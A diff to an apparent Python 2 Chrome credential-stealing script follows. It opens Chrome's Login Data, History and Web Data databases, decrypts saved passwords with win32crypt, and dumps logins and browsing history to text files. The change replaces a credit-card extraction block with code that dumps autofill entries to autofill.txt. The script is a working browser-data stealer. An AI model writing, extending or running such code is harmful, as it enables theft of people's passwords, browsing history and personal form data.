@@ -2,10 +2,11 @@ from __future__ import print_function
 from os import getenv
 import sqlite3
 import win32crypt
+import sys
+reload(sys)
+sys.setdefaultencoding('utf-8')
 
 print("""
-
-
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMMMMM        MMMMMMMMMMMM
 MMMMMMMMMM            MMMMMMMMMM
@@ -47,8 +48,10 @@ password_field = "Password: "
 conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
 conn3 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\History")
 conn1 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
+conn4 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
 cursor3 = conn3.cursor()
 cursor1 = conn1.cursor()
+cursor4 = conn4.cursor()
 cursor = conn.cursor()
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 for result in cursor.fetchall():
@@ -74,13 +77,12 @@ result4 = cursor3.fetchall()
 for r4 in result4:
         f2.writelines(str('\n' + r4[1] + '\n'))
 
-cursor1.execute("SELECT * FROM credit_cards")
+f6 = open('autofill.txt','w')
+cursor4.execute("SELECT * FROM autofill")
 print('---------------------------------------------')
-print("Credit Card Data:")
-result1 = cursor1.fetchall() 
-for result in cursor.fetchall():
-	cc = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
-	if password:
-		f.writelines(siteId + result[0] + '\n' + username1 + result[1] + '\n' + password_field + password + '\n' + '--------------------------------' + '\n')
+print("Autofill:")
+result1 = cursor4.fetchall() 
+for r6 in result1:
+	f6.writelines(str('\n' + r6[1]))
 
 raw_input()
